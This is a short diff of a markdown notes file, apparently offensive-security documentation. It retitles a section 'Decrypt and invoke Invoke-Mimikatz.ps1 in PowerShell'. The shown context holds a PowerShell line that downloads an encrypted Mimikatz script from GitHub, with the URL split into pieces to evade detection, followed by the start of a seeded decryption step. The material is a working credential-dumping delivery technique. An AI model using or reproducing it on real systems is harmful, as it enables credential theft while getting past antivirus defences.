@@ -105,7 +105,7 @@ for($i=0;$i -lt $Bytes.Length;$i++)
 [io.file]::WriteAllBytes($FileOut,$Bytes)
 ```
 
-### Decrypt and invoke Invoke-Rubeus.ps1 in PowerShell
+### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
 ```powershell
 $Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/' + 'okazymyrov/piki' + '/blob/master/Invoke' + '-Mimi' + 'katz.ps1.encrypted?raw=true')
 $Seed = 42 # seed between 0 and 2147483647
